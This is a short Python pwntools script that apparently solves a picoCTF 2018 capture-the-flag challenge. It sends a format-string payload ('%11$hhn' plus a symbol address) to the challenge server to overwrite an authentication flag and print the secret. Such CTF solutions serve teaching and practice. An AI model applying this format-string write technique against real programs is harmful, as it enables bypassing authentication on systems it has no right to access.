from pwn import *

target = ELF('./auth')

r = remote('2018shell1.picoctf.com', 52398)

payload = ''
payload += p32(target.symbols['authenticated'])
payload += '%11$hhn'

r.sendlineafter('read the flag? (yes/no)\n', payload)

r.recvuntil('Access Granted.\n')

print(r.recvline())
